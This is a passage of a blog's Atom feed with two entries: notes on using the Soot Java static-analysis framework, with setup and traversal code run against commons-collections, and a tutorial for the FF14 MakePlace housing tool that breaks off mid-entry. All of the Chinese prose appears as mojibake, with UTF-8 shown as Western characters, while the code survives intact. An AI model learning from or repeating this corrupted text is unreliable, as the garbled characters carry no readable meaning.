<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jckling&#39;s Blog</title>
  
  
  <link href="https://jckling.github.io/atom.xml" rel="self"/>
  
  <link href="https://jckling.github.io/"/>
  <updated>2022-03-08T05:26:27.000Z</updated>
  <id>https://jckling.github.io/</id>
  
  <author>
    <name>Jckling</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Soot ä½¿ç”¨è®°å½•</title>
    <link href="https://jckling.github.io/2022/02/23/Other/Soot%20%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <id>https://jckling.github.io/2022/02/23/Other/Soot%20%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</id>
    <published>2022-02-23T11:40:17.000Z</published>
    <updated>2022-03-08T05:26:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸ºäº†é¿å…æ¯æ¬¡éƒ½è¦æ‰“å¼€ä¸€å †é¡¹ç›®å›é¡¾ï¼Œç¨å¾®è®°å½•ä¸€äº›å†…å®¹ã€‚</p><h1 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h1><h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><img src="https://s2.loli.net/2022/03/08/wL3laGWBCUg4hmI.jpg" style="zoom: 67%;" /><p>Sceneï¼šåˆ†æç¯å¢ƒ</p><ul><li>ä»£è¡¨ Soot è¾“å…¥ç¨‹åºçš„æ•´ä¸ªè¿è¡Œã€åˆ†æã€å˜æ¢çš„ç¯å¢ƒã€‚</li></ul><p>SootClassï¼šç±»</p><ul><li>library ç±»æ¥è‡ª Soot çš„ classpathï¼Œä½†åªåœ¨éœ€è¦æ—¶åŠ è½½ï¼›</li><li>application åºç±»æ˜¯ä»è¿›ç¨‹ç›®å½•ä¸­è·å–çš„ï¼Œå¹¶ä¸”æ€»æ˜¯è¢«åŠ è½½å’Œè½¬æ¢ï¼›</li><li>phantom ç±»æ˜¯æ—¢ä¸åœ¨è¿›ç¨‹ç›®å½•ä¸­ä¹Ÿä¸åœ¨ Soot çš„ classpath ä¸­çš„ç±»ï¼Œä½†å®ƒä»¬è¢« Soot åŠ è½½çš„ä¸€äº›ç±»/æ–¹æ³•ä½“æ‰€å¼•ç”¨<ul><li>å¦‚æœå¯ç”¨äº† phantom ç±»ï¼ŒSoot ä¸ä¼šå› ä¸ºè¿™ç§æ— æ³•è§£å†³çš„å¼•ç”¨è€Œä¸­æ­¢æˆ–å¤±è´¥ï¼Œè€Œæ˜¯åˆ›å»ºä¸€ä¸ªç©ºçš„å­˜æ ¹ï¼Œç§°ä¸º phantom ç±»ï¼Œå®ƒåŒ…å« phantom æ–¹æ³•æ¥å¼¥è¡¥ç¼ºå¤±çš„éƒ¨åˆ†ã€‚</li></ul></li></ul><p>SootMethodï¼šç±»ä¸­çš„å•ä¸ªæ–¹æ³•</p><img src="https://s2.loli.net/2022/03/08/iBpeRNHVOQh49KX.jpg" style="zoom:25%;" /><p>SootFieldï¼šç±»ä¸­çš„å•ä¸ªå±æ€§</p><p>Bodyï¼šæ–¹æ³•ä½“</p><ul><li>ç”± Locals é“¾ï¼ˆbody.getLoclas()ï¼‰ã€Units é“¾ï¼ˆbody.getUnits()ï¼‰ã€Traps é“¾ï¼ˆbody.getTraps()ï¼‰ç»„æˆã€‚</li><li>Locals é“¾å­˜å‚¨æ–¹æ³•ä¸­çš„å˜é‡å®šä¹‰</li><li>Units é“¾å­˜å‚¨æ–¹æ³•ä¸­çš„å¥å­</li><li>Traps é“¾å­˜å‚¨æ–¹æ³•ä¸­å‘ç”Ÿå¼‚å¸¸çš„è¯­å¥</li></ul><p>Boxï¼šæŒ‡é’ˆ</p><ul><li>åŒ…æ‹¬ UnitBoxã€ValueBox</li><li>ä¸€ä¸ª Unit å¯ä»¥æœ‰å¤šä¸ª UnitBoxï¼Œä½†æ˜¯æ¯ä¸ª UnitBox åªèƒ½æŒ‡å‘ä¸€ä¸ª Unitã€‚</li><li>ValueBox åŒ…å«åœ¨ Unit ä¸­ä½¿ç”¨çš„å€¼ä»¥åŠå®šä¹‰çš„å€¼ã€‚</li></ul><p>Stmt ä¸ Unit éƒ½è¡¨ç¤ºæ–¹æ³•ä¸­çš„ä¸€ä¸ªå¥å­ã€‚interface Unit ç»§æ‰¿äº interface Stmtï¼›åŒæ · AssignStmtã€IdentityStmtã€IfStmtã€RetrunVoidStmtã€NopStmt ç­‰ä¹Ÿç»§æ‰¿äº interface Stmtã€‚</p><ul><li>Unit åœ¨ Jimple ä¸­çš„å®ç°æ˜¯ Stmt</li><li>ä¸åŒï¼šUnit æ³¨é‡äºå¥å­çš„æ„æˆã€è€Œ AssignStmt ä¹‹ç±»çš„åˆ™æ³¨é‡å¥å¼çš„ç§ç±»</li><li>æ³¨æ„ï¼šAssignStmt è¡¨ç¤ºèµ‹å€¼è¯­å¥ï¼›è€Œ IdentityStmt è¡¨ç¤ºå°†å‚æ•°èµ‹å€¼ç»™ Local è¿™æ ·çš„è¯­å¥</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸€èˆ¬ Value æŒ‡çš„æ˜¯ Localï¼ˆå˜é‡ï¼‰ã€Exprï¼ˆè¡¨è¾¾å¼ï¼‰ã€Constantï¼ˆå¸¸é‡ï¼‰</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;ValueBox&gt; <span class="title">getUseBoxes</span><span class="params">()</span></span>;<span class="comment">//è¿”å› Unit ä¸­ä½¿ç”¨çš„ Value çš„å¼•ç”¨</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;ValueBox&gt; <span class="title">getDefBoxes</span><span class="params">()</span></span>;<span class="comment">//è¿”å› Unit ä¸­å®šä¹‰çš„ Value çš„å¼•ç”¨</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;ValueBox&gt; <span class="title">getUseAndDefBox</span><span class="params">()</span></span>;<span class="comment">//è¿”å› Unit ä¸­å®šä¹‰å¹¶ä½¿ç”¨çš„ Value çš„å¼•ç”¨</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List <span class="title">geUnitBoxes</span><span class="params">()</span></span>;<span class="comment">//è·å¾— Unit è·³è½¬åˆ°çš„ UnitxBox åˆ—è¡¨</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List <span class="title">getBoxesPointingTothis</span><span class="params">()</span></span>;<span class="comment">//Unit ä½œä¸ºè·³è½¬å¯¹è±¡æ—¶ï¼Œè·å–æ‰€æœ‰è·³è½¬åˆ°è¯¥ Unit çš„ UnitBox</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">fallsThrough</span><span class="params">()</span></span>;<span class="comment">//å¦‚æœæ¥ä¸‹æ¥æ‰§è¡Œåé¢çš„ Unitï¼Œåˆ™ä¸º true</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">branches</span><span class="params">()</span></span>;<span class="comment">//å¦‚æœæ‰§è¡Œæ—¶ä¼šè·³è½¬åˆ°å…¶ä»– Unitï¼Œåˆ™è¿”å› trueã€‚å¦‚ï¼šIfStmtã€GotoStmt</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rediectJumpsToThisTo</span><span class="params">(Unit newLocation)</span></span>;<span class="comment">//æŠŠè·³è½¬åˆ° Unit é‡å®šå‘åˆ° newLocation</span></span><br></pre></td></tr></table></figure><h2 id="æ‰§è¡Œæµ"><a href="#æ‰§è¡Œæµ" class="headerlink" title="æ‰§è¡Œæµ"></a>æ‰§è¡Œæµ</h2><p>Soot æ‰§è¡Œè¢«åˆ†æˆå‡ ä¸ªé˜¶æ®µï¼Œè¿™äº›é˜¶æ®µè¢«ç§°ä¸º Packsã€‚</p><ul><li>ç¬¬ä¸€æ­¥ç”Ÿæˆ Jimple ä»£ç ï¼Œç„¶åå°† Jimple ä»£ç è¾“å…¥åˆ°å…¶ä»– Packs ä¸­ã€‚<ul><li>é€šè¿‡è§£æ classã€jimple æˆ– java æ–‡ä»¶å†é€šè¿‡ Jimple Bodyï¼ˆjbï¼‰ä¼ é€’å®ƒä»¬çš„ç»“æœè€Œå®Œæˆçš„ã€‚</li></ul></li><li>Soot æ ¹æ®åˆ†æé—®é¢˜æ˜¯è¿‡ç¨‹å†…åˆ†æè¿˜æ˜¯è¿‡ç¨‹é—´åˆ†æï¼Œä¼šæœ‰ä¸åŒçš„æ‰§è¡Œæµã€‚<ul><li>è¿‡ç¨‹å†…åˆ†æç®€å•çš„è¯´å°±æ˜¯è¢«åˆ†æçš„ç¨‹åºä¸­ä¸å­˜åœ¨å‡½æ•°è°ƒç”¨ã€‚<ul><li><img src="https://s2.loli.net/2022/03/08/tvuoyqk5MZnzAPF.jpg" style="zoom:67%;" /></li></ul></li><li>è¿‡ç¨‹é—´åˆ†æç®€å•çš„è¯´å°±æ˜¯å­˜åœ¨å‡½æ•°è°ƒç”¨ã€‚<ul><li>è¿‡ç¨‹é—´åˆ†ææ—¶ï¼Œéœ€è¦æŒ‡å®š Soot è¿è¡Œåœ¨ whole-program æ¨¡å¼ä¸‹ã€‚æ­¤æ—¶ Soot ä¼šå¢åŠ ä¸‰ä¸ªé˜¶æ®µï¼šcgï¼ˆcall-graph generationï¼‰ã€wjtpï¼ˆwhole Jimple transformation packï¼‰ã€wjapï¼ˆwhole Jimple annotation packï¼‰</li><li><img src="https://s2.loli.net/2022/03/08/yRuiWU3qtgLA7bs.jpg" style="zoom:67%;" /></li></ul></li></ul></li><li>Pack å‘½åè§„åˆ™ï¼šç¬¬ä¸€ä¸ªå­—æ¯è¡¨ç¤ºé‡‡ç”¨å“ªç§ä¸­é—´è¯­è¨€ï¼Œä¾‹å¦‚sï¼ˆshimpleï¼‰ï¼Œjï¼ˆjimpleï¼‰ï¼Œbï¼ˆbafï¼‰ï¼Œgï¼ˆgrimpï¼‰ï¼›ç¬¬äºŒä¸ªå­—æ¯è¡¨ç¤ºè¿›è¡Œåˆ° Pack çš„å“ªä¸€æ­¥ï¼Œä¾‹å¦‚ï¼šbï¼ˆbody creationï¼‰ï¼Œtï¼ˆtransformationï¼‰ï¼Œoï¼ˆoptimizationsï¼‰ï¼Œaï¼ˆannotionï¼‰ï¼›p è¡¨ç¤ºâ€œpackâ€ï¼Œæ˜¯å¤„ç†é˜¶æ®µçš„æ„æ€ã€‚</li></ul><h1 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h1><p>æŠŠ jar æ–‡ä»¶è§£å‹åˆ°æ–‡ä»¶å¤¹ï¼Œå¦‚å›¾ï¼š</p><img src="https://s2.loli.net/2022/02/23/h5dMQPBt4oA8Kkl.png" width="80%"/><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>ä½¿ç”¨ <code>Scene.v().loadBasicClasses()</code> æˆ– <code>Scene.v().loadNecessaryClasses()</code>ï¼Œä¸ç”¨éƒ½å†™ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String output = <span class="string">&quot;C:\\Users\\linki\\Desktop\\demo&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String sourceDirectory = <span class="string">&quot;C:\\Users\\linki\\Desktop\\demo\\commons-collections-3.1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setupSoot</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    G.reset();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡ºæ ¼å¼</span></span><br><span class="line">    Options.v().set_output_dir(output); <span class="comment">// è®¾ç½® IR Jimple çš„è¾“å‡ºç›®å½•</span></span><br><span class="line">    Options.v().set_output_format(Options.output_format_jimple);</span><br><span class="line"></span><br><span class="line">    Options.v().set_process_dir(Collections.singletonList(sourceDirectory));    <span class="comment">// å¾…åˆ†æçš„è·¯å¾„</span></span><br><span class="line">    <span class="comment">// Options.v().set_soot_classpath(sourceDirectory);    // JDK å’Œå¾…åˆ†æçš„ jar éƒ½è¦åŠ å…¥ classpath</span></span><br><span class="line"></span><br><span class="line">    Options.v().set_prepend_classpath(<span class="keyword">true</span>);</span><br><span class="line">    Options.v().set_allow_phantom_refs(<span class="keyword">true</span>);</span><br><span class="line">    Options.v().set_keep_line_number(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    Options.v().set_whole_program(<span class="keyword">true</span>);    <span class="comment">// å…¨ç¨‹åºåˆ†æ</span></span><br><span class="line">    Options.v().set_verbose(<span class="keyword">true</span>);          <span class="comment">// æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    Scene.v().loadBasicClasses();</span></span><br><span class="line">    Scene.v().loadNecessaryClasses();   <span class="comment">// åŠ è½½ Soot ä¾èµ–çš„ç±»å’Œå‘½ä»¤è¡ŒæŒ‡å®šçš„ç±»</span></span><br><span class="line">    Scene.v().loadDynamicClasses();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="éå†"><a href="#éå†" class="headerlink" title="éå†"></a>éå†</h2><p>éå†æ‰€æœ‰ç±»åŠå…¶æ–¹æ³•ï¼Œæ³¨æ„ï¼š</p><ul><li><code>loadXXX</code> æ–¹æ³•è¯»å–çš„ç±»ä¸å¤šï¼Œç›´æ¥éå† JDK è·¯å¾„è¯»å–æ‰å…¨é¢ï¼›</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// é…ç½®</span></span><br><span class="line">    setupSoot();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰§è¡Œåˆ†æ</span></span><br><span class="line">    PackManager.v().runPacks();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆè®¡</span></span><br><span class="line">    System.out.printf(<span class="string">&quot;%d = %d + %d + %d%n&quot;</span>,</span><br><span class="line">            Scene.v().getClasses().size(),</span><br><span class="line">            Scene.v().getApplicationClasses().size(),</span><br><span class="line">            Scene.v().getLibraryClasses().size(),</span><br><span class="line">            Scene.v().getPhantomClasses().size()</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†ç±»</span></span><br><span class="line">    <span class="keyword">for</span> (SootClass klass : Scene.v().getClasses()) &#123;</span><br><span class="line">        <span class="comment">// ç±»å</span></span><br><span class="line">        System.out.println(klass.getName());</span><br><span class="line">        <span class="comment">// éå†æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">for</span> (SootMethod method : klass.getMethods()) &#123;</span><br><span class="line">            <span class="comment">// æ–¹æ³•ç­¾å</span></span><br><span class="line">            System.out.println(method.getSignature());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç±»ä¿¡æ¯"><a href="#ç±»ä¿¡æ¯" class="headerlink" title="ç±»ä¿¡æ¯"></a>ç±»ä¿¡æ¯</h2><p>æ ¹æ®ç±»åè·å¾—ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SootClass klass = Scene.v().getSootClass(<span class="string">&quot;java.io.ObjectInputStream&quot;</span>);</span><br><span class="line">System.out.println(klass.getJavaPackageName());         <span class="comment">// åŒ…å</span></span><br><span class="line">System.out.println(klass.getSuperclass().getName());    <span class="comment">// çˆ¶ç±»å</span></span><br><span class="line">System.out.println(klass.getName());                    <span class="comment">// ç±»å</span></span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•ä¿¡æ¯"><a href="#æ–¹æ³•ä¿¡æ¯" class="headerlink" title="æ–¹æ³•ä¿¡æ¯"></a>æ–¹æ³•ä¿¡æ¯</h2><p>æ ¹æ®æ–¹æ³•ç­¾åè·å¾—æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SootMethod method = Scene.v().getMethod(<span class="string">&quot;&lt;java.io.ObjectInputStream: java.lang.Object readObject()&gt;&quot;</span>);</span><br><span class="line">System.out.println(method.getDeclaringClass().getName());   <span class="comment">// æ‰€å±ç±»</span></span><br><span class="line">System.out.println(method.getSignature());                  <span class="comment">// ç­¾å</span></span><br><span class="line">System.out.println(method.getSubSignature());               <span class="comment">// å­ç­¾å</span></span><br><span class="line">System.out.println(method.getName());                       <span class="comment">// æ–¹æ³•å</span></span><br></pre></td></tr></table></figure><p>åˆ†ææ–¹æ³•ä½“ï¼Œæ³¨æ„ï¼š</p><ul><li>æœ‰äº›æ–¹æ³•æ²¡æœ‰æ–¹æ³•ä½“ï¼Œ<code>hasActiveBody</code> å°†è¿”å› false</li><li><code>retrieveActiveBody</code> ä¼šä¸ºæ²¡æœ‰æ–¹æ³•ä½“çš„æ–¹æ³•æ„å»ºæ–¹æ³•ä½“ï¼Œä½†å¯èƒ½æŠ›å‡ºå¼‚å¸¸ï¼Œå¤„ç†ä¹‹åç¬¬äºŒæ¬¡è°ƒç”¨å°†å¾—åˆ°æ–¹æ³•ä½“</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(method.hasActiveBody() + <span class="string">&quot;: &quot;</span> + method.getSignature());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Jimple Body</span></span><br><span class="line">JimpleBody jb = (JimpleBody) method.retrieveActiveBody();</span><br><span class="line"></span><br><span class="line"><span class="comment">// éå†å…¶ä¸­çš„ Unit</span></span><br><span class="line"><span class="keyword">for</span> (Unit u : jb.getUnits()) &#123;</span><br><span class="line">    <span class="comment">// è¯­å¥</span></span><br><span class="line">    Stmt stmt = (Stmt) u;</span><br><span class="line">    <span class="keyword">if</span> (stmt.containsInvokeExpr()) &#123;</span><br><span class="line">        InvokeExpr invokeExpr = stmt.getInvokeExpr();</span><br><span class="line">        invokeExpr.apply(<span class="keyword">new</span> AbstractExprSwitch() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke instance method; special handling for superclass, private, and instance initialization method invocations</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseSpecialInvokeExpr</span><span class="params">(SpecialInvokeExpr v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.caseSpecialInvokeExpr(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseSpecialInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke a class (static) method</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseStaticInvokeExpr</span><span class="params">(StaticInvokeExpr v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.caseStaticInvokeExpr(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseStaticInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke instance method; dispatch based on class</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseVirtualInvokeExpr</span><span class="params">(VirtualInvokeExpr v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.caseVirtualInvokeExpr(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseVirtualInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke dynamic method</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseDynamicInvokeExpr</span><span class="params">(DynamicInvokeExpr v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.caseDynamicInvokeExpr(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseDynamicInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke interface method</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseInterfaceInvokeExpr</span><span class="params">(InterfaceInvokeExpr v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.defaultCase(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseInterfaceInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">defaultCase</span><span class="params">(Object v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.defaultCase(v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="TBC"><a href="#TBC" class="headerlink" title="TBC"></a>TBC</h1>]]></content>
    
    
    <summary type="html">Soot çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•åŠæ³¨æ„ç‚¹</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>FF14 MakePlace ä½¿ç”¨æ•™ç¨‹</title>
    <link href="https://jckling.github.io/2022/02/09/Game/FFXIV/FF14-MakePlace%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>https://jckling.github.io/2022/02/09/Game/FFXIV/FF14-MakePlace%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</id>
    <published>2022-02-09T02:15:39.000Z</published>
    <updated>2022-02-10T10:32:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰å¤ªä¹…æ²¡ä¸Šæ¸¸æˆ S æˆ¿ç‚¸äº†ï¼Œç°åœ¨ä¹°äº†ä¸ªå…¬å¯“æƒ³è¯•è¯•è£…ä¿®æˆæ‘„å½±æ£šï¼Œé¢„è§ˆäº†åŠå¤©å®¶å…·ï¼Œç„¶åæœç´¢åˆ°ä¸€ä¸ªè£…ä¿®ç¥å™¨ â€”â€” MakePlaceã€‚è¯¥å·¥å…·å¯ä»¥è®©ä½ åœ¨æœ¬åœ°è¿›è¡Œå®Œæ•´çš„è£…ä¿®é¢„è§ˆï¼Œç›®å‰å·²æ”¯æŒä¸­æ–‡ï¼Œå¹¶ä¸”å¯ä»¥è¿‡æ»¤æ‰å›½é™…æœå®¶å…·ã€‚</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>å®˜ç½‘ï¼š<a href="https://jawslouis.itch.io/makeplace">https://jawslouis.itch.io/makeplace</a> æ‹‰åˆ°ç½‘é¡µä¸­é—´å·¦å³æœ‰ä¸ªä¸‹è½½æŒ‰é’®ï¼Œçº¦ 1GB å·¦å³çš„ç¨‹åºæ–‡ä»¶ï¼Œè§£å‹åæ”¾åˆ°æƒ³è¦å®‰è£…çš„ç›®å½•å³å¯ã€‚</p><img src="https://s2.loli.net/2022/02/09/m8rVYUv7PFe2hnL.jpg" ><p>å»ºè®®è§£å‹åˆ° MakePlace æ–‡ä»¶å¤¹ï¼ˆè‡ªå·±æ–°å»ºï¼‰ï¼Œç„¶åæ‹–æ”¾åˆ°å®‰è£…ç›®å½•ï¼ŒåŒå‡» MakePlace.exe å³å¯å¯åŠ¨ç¨‹åºã€‚</p><img src="https://s2.loli.net/2022/02/09/rqtAeN6vfZnMFD9.png" ><h1 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h1><p>é¦–å…ˆï¼Œç‚¹å‡»å³ä¾§é½¿è½®å°†è¯­è¨€è®¾ç½®ä¸ºä¸­æ–‡ï¼š</p><img src="https://s2.loli.net/2022/02/09/jxr8IbsQ17NOEDA.jpg" ><p>æ¯æ¬¡ä¿å­˜å‰éƒ½è¦åœ¨è®¾ç½®å½“ä¸­è®¾å®šæ–‡ä»¶åç§°ï¼Œå¦åˆ™ä¼šç›´æ¥è¦†ç›–ï¼›åŠ è½½è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¿å­˜åçš„æ–‡ä»¶ï¼Œè¿˜æœ‰ä¸ªç¤ºä¾‹æ–‡ä»¶ <code>Clair de Lune</code> ã€‚</p><img src="https://s2.loli.net/2022/02/09/9Ifct7ZLSBRimhr.jpg" ><ul><li>æˆ¿å±‹å¤§å°å¯ä»¥è‡ªè¡Œè®¾ç½®ï¼ŒåŒ…æ‹¬ï¼šå…¬å¯“ã€å°å‹æˆ¿ã€ä¸­å‹æˆ¿ã€å¤§å‹æˆ¿ï¼›</li><li>é™¤å…¬å¯“ä¹‹å¤–ï¼Œéƒ½å¯ä»¥è¿›å…¥åº­é™¢ï¼Œæˆ–ä»åº­é™¢è¿›å…¥æˆ¿å±‹ï¼Œåº­é™¢ä¹Ÿå¯ä»¥è¿›è¡Œè£…ä¿®ï¼›</li><li>å…‰ç…§ç­‰çº§æ˜¯æ»‘åŠ¨æ¡ï¼›</li><li>å®¶å…·åˆ—è¡¨æ˜¾ç¤ºå½“å‰å®¶å…·å¯æ›¿æ¢çš„å…¶ä»–å®¶å…·ï¼ˆï¼Ÿï¼‰ï¼›</li><li>fixture list æ˜¾ç¤ºå›ºå®šè¿™å‡ é¡¹çš„è®¾ç½®ï¼Œç‚¹å‡»å¯ä»¥æ›´æ”¹ã€‚</li></ul><img src="https://s2.loli.net/2022/02/09/mezunhKVlMjyQiP.jpg" 